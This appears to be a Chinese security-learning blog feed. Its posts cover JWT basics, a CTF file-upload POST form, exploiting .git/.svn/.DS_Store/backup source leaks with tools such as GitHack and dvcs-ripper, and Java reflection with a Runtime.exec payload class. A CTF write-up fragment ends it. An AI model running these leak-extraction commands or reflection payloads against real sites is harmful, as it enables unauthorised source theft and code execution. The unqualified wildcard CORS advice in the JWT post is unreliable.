<p>没有会话信息意味着应用程序可以根据需要扩展和添加更多的机器，而不必担心用户登录的位置。</p>
</blockquote>
<p>虽然这一实现可能会有所不同，但其主要流程如下：</p>
<ol>
<li>用户携带用户名和密码请求访问</li>
<li>服务器校验用户凭据</li>
<li>应用提供一个token给客户端</li>
<li>客户端存储token，并且在随后的每一次请求中都带着它</li>
<li>服务器校验token并返回数据</li>
</ol>
<p>注意：</p>
<ol>
<li>每一次请求都需要token</li>
<li>Token应该放在请求header中</li>
<li>我们还需要将服务器设置为接受来自所有域的请求，用Access-Control-Allow-Origin: *</li>
</ol>
<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p>原文：<a href="https://www.cnblogs.com/cjsblog/p/9277677.html">https://www.cnblogs.com/cjsblog/p/9277677.html</a></p>
<p><a href="https://jwt.io/">https://jwt.io/</a></p>
<p><a href="https://scotch.io/tutorials/the-ins-and-outs-of-token-based-authentication#toc-why-tokens-came-around">https://scotch.io/tutorials/the-ins-and-outs-of-token-based-authentication#toc-why-tokens-came-around</a></p>
<p><a href="https://tools.ietf.org/html/rfc7519#section-3">https://tools.ietf.org/html/rfc7519#section-3</a></p>
<p><a href="http://blog.leapoahead.com/2015/09/06/understanding-jwt/">http://blog.leapoahead.com/2015/09/06/understanding-jwt/</a></p>
<p><a href="https://cnodejs.org/topic/557844a8e3cc2f192486a8ff">https://cnodejs.org/topic/557844a8e3cc2f192486a8ff</a></p>
<p><a href="http://blog.leapoahead.com/2015/09/07/user-authentication-with-jwt/">http://blog.leapoahead.com/2015/09/07/user-authentication-with-jwt/</a></p>
]]></content>
  </entry>
  <entry>
    <title>一个用于post上传的网页源码</title>
    <url>/2021/09/07/yi-ge-yong-yu-post-shang-chuan-de-wang-ye-yuan-ma/yi-ge-yong-yu-post-shang-chuan-de-wang-ye-yuan-ma/</url>
    <content><![CDATA[<pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span><span class="token constant">POST</span>数据包<span class="token constant">POC</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://faebbc7b-35b5-4792-8b8a-9af1ec7fc48f.node3.buuoj.cn/upload.php?ctf<span class="token punctuation">=</span>upload<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token comment" spellcheck="true">&lt;!--链接是当前打开的题目链接--></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>文件名：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>postedFile<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>postedFile<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre>
]]></content>
  </entry>
  <entry>
    <title>web源码泄露学习</title>
    <url>/2021/09/21/web-yuan-ma-xie-lu-xue-xi/web-yuan-ma-xie-lu-xue-xi/</url>
    <content><![CDATA[<h2 id="git泄露"><a href="#git泄露" class="headerlink" title=".git泄露"></a>.git泄露</h2><h4 id="漏洞成因："><a href="#漏洞成因：" class="headerlink" title="漏洞成因："></a>漏洞成因：</h4><p>在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。</p>
<h4 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h4><p>工具：</p>
<h5 id="Githack"><a href="#Githack" class="headerlink" title="Githack"></a>Githack</h5><pre><code>python2 Githack.py http://xxx.com/.git、</code></pre>
<h5 id="dvcs-ripper"><a href="#dvcs-ripper" class="headerlink" title="dvcs-ripper"></a>dvcs-ripper</h5><pre><code>rip-git.pl -v -u http://www.example.com/.git/</code></pre>
<h5 id="Git-Extract"><a href="#Git-Extract" class="headerlink" title="Git_Extract"></a>Git_Extract</h5><pre><code>python2 git_extract.py http://.../.git/</code></pre>
<h2 id="swp文件泄露"><a href="#swp文件泄露" class="headerlink" title="swp文件泄露"></a>swp文件泄露</h2><h4 id="漏洞成因：-1"><a href="#漏洞成因：-1" class="headerlink" title="漏洞成因："></a>漏洞成因：</h4><p>swp即swap文件，在编辑文件时产生的临时文件，它时隐藏文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留。</p>
<p>文件名格式：.filename.swp(有时候也可能是swo)</p>
<h4 id="漏洞利用：-1"><a href="#漏洞利用：-1" class="headerlink" title="漏洞利用："></a>漏洞利用：</h4><p>直接按照文件名访问.swp文件，下载回来后再linux中使用vim -r .filename.swp来恢复源码</p>
<h2 id="hg泄露"><a href="#hg泄露" class="headerlink" title=".hg泄露"></a>.hg泄露</h2><h4 id="漏洞成因：-2"><a href="#漏洞成因：-2" class="headerlink" title="漏洞成因："></a>漏洞成因：</h4><p>hg init的时候会生成.hg文件</p>
<p>如：</p>
<pre><code>http://www.xxx.com/.hg/</code></pre>
<h4 id="漏洞利用：-2"><a href="#漏洞利用：-2" class="headerlink" title="漏洞利用："></a>漏洞利用：</h4><p>工具：</p>
<h5 id="dvcs-ripper-1"><a href="#dvcs-ripper-1" class="headerlink" title="dvcs-ripper"></a>dvcs-ripper</h5><pre><code>rip-hg.pl -v -u http://www.example.com/.hg/
通用格式：rip-xxx.pl -v -u http://www.example.com/.xx/</code></pre>
<h2 id="DS-Store文件泄露"><a href="#DS-Store文件泄露" class="headerlink" title=".DS_Store文件泄露"></a>.DS_Store文件泄露</h2><h4 id="漏洞成因：-3"><a href="#漏洞成因：-3" class="headerlink" title="漏洞成因："></a>漏洞成因：</h4><p>在发布代码时未删除文件夹中隐藏的.DS_store，被发现后，可以获取敏感的文件名等信息。<br>漏洞利用:</p>
<p>工具：</p>
<h5 id="dsstoreexp"><a href="#dsstoreexp" class="headerlink" title="dsstoreexp"></a>dsstoreexp</h5><pre><code>python ds_store_exp.py http://www.example.com/.DS_Store</code></pre>
<h2 id="网站备份压缩文件"><a href="#网站备份压缩文件" class="headerlink" title="网站备份压缩文件"></a>网站备份压缩文件</h2><h4 id="漏洞成因：-4"><a href="#漏洞成因：-4" class="headerlink" title="漏洞成因："></a>漏洞成因：</h4><p>服务器管理员错误地将网站或者网页的备份文件放置到服务器web目录下。<br>编辑器在使用过程中自动保存的备份文件或者临时文件因为各种原因没有被删除而保存在web目录下。</p>
<h4 id="常见备份文件后缀"><a href="#常见备份文件后缀" class="headerlink" title="常见备份文件后缀"></a>常见备份文件后缀</h4><pre><code>.rar
.zip
.7z
.tar.gz
.bak
.swp
.txt
.html
.php~
.php.</code></pre>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>工具：</p>
<h5 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h5><pre><code>python3 dirsearch -u "xxx" -e php,rar,zip,txt</code></pre>
<h2 id="SVN导致文件泄露"><a href="#SVN导致文件泄露" class="headerlink" title="SVN导致文件泄露"></a>SVN导致文件泄露</h2><h4 id="漏洞成因：-5"><a href="#漏洞成因：-5" class="headerlink" title="漏洞成因："></a>漏洞成因：</h4><p>Subversion，简称SVN，是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上越来越多的控制服务从CVS转移到Subversion。</p>
<p>Subversion使用服务端—客户端的结构，当然服务端与客户端可以都运行在同一台服务器上。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射（称为“工作副本”）。在这两端之间，是通过各种仓库存取层（Repository Access，简称RA）的多条通道进行访问的。这些通道中，可以通过不同的网络协议，例如HTTP、SSH等，或本地文件的方式来对仓库进行操作。<br>漏洞利用</p>
<p>工具：</p>
<h5 id="dvcs-ripper-2"><a href="#dvcs-ripper-2" class="headerlink" title="dvcs-ripper"></a>dvcs-ripper</h5><pre><code>rip-svn.pl -v -u http://www.example.com/.svn/</code></pre>
<h2 id="WEB-INF-web-xml泄露"><a href="#WEB-INF-web-xml泄露" class="headerlink" title="WEB-INF/web.xml泄露"></a>WEB-INF/web.xml泄露</h2><h4 id="WEB-INF简介及漏洞成因"><a href="#WEB-INF简介及漏洞成因" class="headerlink" title="WEB-INF简介及漏洞成因"></a>WEB-INF简介及漏洞成因</h4><p>WEB-INF是java的web应用的安全目录，如果想在页面中直接访问其中的文件，必须通过web.xml文件对其进行相应的映射才能访问。Tomcat默认禁止这个目录，而Nginx在映射静态文件时，把WEB-INF目录映射进去，而又没有做Nginx的相关安全配置（或Nginx自身缺陷），导致可以通过Nginx访问到Tomcat的WEB-INF目录。</p>
<h4 id="WEB-INF主要包含以下文件或目录："><a href="#WEB-INF主要包含以下文件或目录：" class="headerlink" title="WEB-INF主要包含以下文件或目录："></a>WEB-INF主要包含以下文件或目录：</h4><pre><code>WEB-INF/web.xml：web应用程序配置文件，描述了servlet和其他的应用组件配置和命名规则
WEB-INF/classes：包含了站点的所有class文件，包括servlet class和非servlet class
WEB-INF/lib：存放web应用需要的各种jar文件，放置仅在这个应用中要求的文件，如数据库
WEB-INF/src：源码目录，按照包名结构放置各种java文件
WEB-INF/database.properties：数据库配置文件
META-INF：相当于一个信息包</code></pre>
<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>直接手工访问/web.xml文件，通过是否回显来判断是否可访问该文件。找到web.xml文件后，根据命名规则推断class文件的路径，最后直接访问class文件，或通过反编译等得到网站源码。</p>
<p>如：</p>
<pre><code>com.wm.ctf.FlagController 推断的文件路径为
WEB-INF/classes/com/wm/ctf/FlagController.class</code></pre>
<h2 id="CVS泄露"><a href="#CVS泄露" class="headerlink" title="CVS泄露"></a>CVS泄露</h2><h4 id="漏洞利用：-3"><a href="#漏洞利用：-3" class="headerlink" title="漏洞利用："></a>漏洞利用：</h4><p>直接访问来测试</p>
<pre><code>http://url/CVS/Root 返回根信息
http://url/CVS/Entries 返回所有文件的结构</code></pre>
<h4 id="取回源码的命令-liunx下"><a href="#取回源码的命令-liunx下" class="headerlink" title="取回源码的命令(liunx下)"></a>取回源码的命令(liunx下)</h4><pre><code>bk clone http://url/aaa bbb</code></pre>
<p>意思是把远端一个名为aaa的repo仓库clone到本地名为bbb的目录下</p>
<p>查看所有的改变的命令(转到downloads目录下)</p>
<pre><code>bk changes</code></pre>
<h2 id="Bazaar-bzr泄露"><a href="#Bazaar-bzr泄露" class="headerlink" title="Bazaar/bzr泄露"></a>Bazaar/bzr泄露</h2><h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用:"></a>漏洞利用:</h4><p>工具：</p>
<h5 id="dvcs-ripper-3"><a href="#dvcs-ripper-3" class="headerlink" title="dvcs-ripper"></a>dvcs-ripper</h5><pre><code>rip-bzr.pl -v -u http://www.example.com/.bzr/</code></pre>
<p>原文链接：<a href="https://blog.csdn.net/Dguaiguai/article/details/108165939">https://blog.csdn.net/Dguaiguai/article/details/108165939</a></p>
]]></content>
  </entry>
  <entry>
    <title>Java反射学习</title>
    <url>/2022/04/20/javasec/java-fan-she-xue-xi/java-fan-she-xue-xi/</url>
    <content><![CDATA[<p>本文基于『代码审计』知识星球 - 《java安全漫谈》<br>看一段代码</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">execute</span><span class="token punctuation">(</span>String className<span class="token punctuation">,</span> String methodName<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
 Class <span class="token class-name">clazz</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>
 clazz<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>methodName<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>clazz<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>这⼏个⽅法包揽了Java安全⾥各种和反射有关的Payload。</p>
<h3 id="反射的概念"><a href="#反射的概念" class="headerlink" title="反射的概念"></a>反射的概念</h3><p>反射是Java的特征之一，是一种间接操作目标对象的机制，核心是JVM在运行状态的时候才动态加载类，对于任意一个类都能够知道这个类所有的属性和方法，并且对于任意一个对象，都能够调用它的方法/访问属性。这种动态获取信息以及动态调用对象方法的功能成为Java语言的反射机制。通过使用反射我们不仅可以获取到任何类的成员方法(Methods)、成员变量(Fields)、构造方法(Constructors)等信息，还可以动态创建Java类实例、调用任意的类方法、修改任意的类成员变量值等。</p>
<p>java反射机制组成需要重点注意以下的类：</p>
<p>java.lang.Class：类对象;</p>
<p>java.lang.reflect.Constructor：类的构造器对象;</p>
<p>java.lang.reflect.Field：类的属性对象;</p>
<p>java.lang.reflect.Method：类的方法对象;</p>
<h3 id="获取类的方法"><a href="#获取类的方法" class="headerlink" title="获取类的方法"></a>获取类的方法</h3><ol>
<li>class.forName()方法，无需import可以加载任意类，执行static()中的代码</li>
<li>obj.getClass()方法,需上下文存在某个类的实例obj</li>
<li>.class直接获取，获取已经加载的某个类，不属于反射</li>
<li>getSystemClassLoader().loadClass()，N不会执行static()中的代码</li>
</ol>
<p>forName有两个函数重载： </p>
<pre class=" language-java"><code class="language-java">Class <span class="token class-name">forName</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> 
<span class="token comment" spellcheck="true">//等于</span>
Class <span class="token class-name">forName</span><span class="token punctuation">(</span>String name<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token keyword">boolean</span><span class="token operator">*</span><span class="token operator">*</span> initialize<span class="token punctuation">,</span> ClassLoader loader<span class="token punctuation">)</span></code></pre>
<p>在 forName 的时候，构造函数并不会执⾏</p>
<p>看如下这个类</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TrainPrint</span> <span class="token punctuation">{</span>
    <span class="token punctuation">{</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Empty block initial %s\n"</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">static</span> <span class="token punctuation">{</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Static initial %s\n"</span><span class="token punctuation">,</span> TrainPrint<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token function">TrainPrint</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Inital %s\n"</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<p>⾸首先调⽤用的是 static {} ，其次是 {} ，最后是构造函数，static {} 就是在“类初始化”的时候调用的，而 {} 中的代码会放在构造函数的 super() 后面，但在当前构造函数内容的前面</p>
<p>forName 中的 initialize=true 其实就是告诉Java虚拟机是否执⾏”类初始化“</p>
<p>假设有如下函数，name可控</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">ref</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
 Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>可以编写恶意类，置于static{}中</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Runtime<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Process<span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TouchFile</span> <span class="token punctuation">{</span>
    <span class="token keyword">static</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            Runtime rt <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            String<span class="token punctuation">[</span><span class="token punctuation">]</span> commands <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"touch"</span><span class="token punctuation">,</span> <span class="token string">"/tmp/success"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
            Process pc <span class="token operator">=</span> rt<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>commands<span class="token punctuation">)</span><span class="token punctuation">;</span>
            pc<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
             <span class="token comment" spellcheck="true">// do nothing</span>
         <span class="token punctuation">}</span>
     <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<p>Java的普通类 C1 中支持编写内部类 C2 ，而在编译的时候，会生成两个文件： <code>C1.class</code> 和 <code>C1$C2.class</code> ，我们可以把他们看作两个无关的类，通过 <code>Class.forName("C1$C2")</code> 即可加载这个内部类。</p>
<h3 id="获取成员变量Field"><a href="#获取成员变量Field" class="headerlink" title="获取成员变量Field"></a>获取成员变量Field</h3><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//返回 字段对象，该对象反映此 类对象表示的类或接口的指定声明字段。</span>
<span class="token function">getDeclaredField</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">//返回 字段对象的数组， 字段对象反映由此 类对象表示的类或接口声明的所有字段。</span>
<span class="token function">getDeclaredFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">//返回 字段对象，该对象反映此 类对象表示的类或接口的指定公共成员字段。</span>
<span class="token function">getField</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">//返回一个包含 字段对象的数组， 字段对象反映此 类对象所表示的类或接口的所有可访问公共字段。</span>
<span class="token function">getFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>上面两个可以获取的是所有的成员变量，下面的两个得到的只有<code>public</code>的成员变量。第一第三个可以传入一个名字（字符串）来得到指定的成员变量，而第二第四个只能得到一个数组，没法得到指定的。前两个虽然不受到<code>public</code>的限制，但是它不能得到超类的成员变量。后两个虽然只能得到<code>public</code>成员变量，但是可以得到超类的<code>public</code>成员变量。</p>
<h3 id="获取方法method"><a href="#获取方法method" class="headerlink" title="获取方法method"></a>获取方法method</h3><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//返回方法对象，该对象反映此类对象表示的类或接口的指定声明方法。</span>
<span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span>String name<span class="token punctuation">,</span> 类<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> parameterTypes<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">//返回一个包含方法对象的数组，方法对象反映此 类对象表示的类或接口的所有已声明方法，包括public，protected，default（package）访问和私有方法，但不包括继承的方法。</span>
<span class="token function">getDeclaredMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">//返回方法对象，该对象反映此类对象表示的类或接口的指定公共成员方法。</span>
<span class="token function">getMethod</span><span class="token punctuation">(</span>String name<span class="token punctuation">,</span> 类<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> parameterTypes<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">//返回一个包含方法对象的数组，方法对象反映此类对象所表示的类或接口的所有公共方法，包括由类或接口声明的那些以及从超类和超接口继承的那些。</span>
<span class="token function">getMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<h3 id="获取构造函数Constructor"><a href="#获取构造函数Constructor" class="headerlink" title="获取构造函数Constructor"></a>获取构造函数Constructor</h3><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//返回一个 构造器对象，该对象反映此 类对象所表示的类或接口的指定构造函数。</span>
<span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span>类<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> parameterTypes<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">//返回 构造器对象的数组， 构造器对象反映由此 类对象表示的类声明的所有构造函数。</span>
<span class="token function">getDeclaredConstructors</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">//返回一个 构造器对象，该对象反映此 类对象所表示的类的指定公共构造函数。</span>
<span class="token function">getConstructor</span><span class="token punctuation">(</span>类<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> parameterTypes<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">//返回一个包含 构造器对象的数组， 构造器对象反映了此 类对象所表示的类的所有公共构造函数。</span>
<span class="token function">getConstructors</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<h3 id="实例化类"><a href="#实例化类" class="headerlink" title="实例化类"></a>实例化类</h3><p>newInstance(),调用这个类的无构造参数</p>
<h3 id="执行函数的方法"><a href="#执行函数的方法" class="headerlink" title="执行函数的方法"></a>执行函数的方法</h3><p>invoke</p>
<p>举个例子，来自《java安全漫谈》</p>
<pre class=" language-java"><code class="language-java">Class <span class="token class-name">clazz</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
clazz<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>clazz<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"calc.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>可以分解为</p>
<pre class=" language-java"><code class="language-java">Class <span class="token class-name">clazz</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
Method execMethod <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
Method getRuntimeMethod <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
Object runtime <span class="token operator">=</span> getRuntimeMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">;</span>
execMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>runtime<span class="token punctuation">,</span> <span class="token string">"calc.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>如果一个类没有无参构造方法，也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类呢？ </p>
<p>如果一个方法或构造方法是私有方法，我们是否能执行它呢？</p>
]]></content>
      <tags>
        <tag>Javasec</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTF 2020-EzPHP 经典题目</title>
    <url>/2021/09/28/phpsec/bjdctf-2020-ezphp-jing-dian-ti-mu/bjdctf-2020-ezphp-jing-dian-ti-mu/</url>
    <content><![CDATA[<p><img src="/2021/09/28/phpsec/bjdctf-2020-ezphp-jing-dian-ti-mu/bjdctf-2020-ezphp-jing-dian-ti-mu/image-20210816183237244.png" alt="image-20210816183237244"></p>
<p>F12</p>
<p><img src="/2021/09/28/phpsec/bjdctf-2020-ezphp-jing-dian-ti-mu/bjdctf-2020-ezphp-jing-dian-ti-mu/image-20210816183257665.png" alt="image-20210816183257665"></p>
<p>base32解码1nD3x.php</p>
<pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 

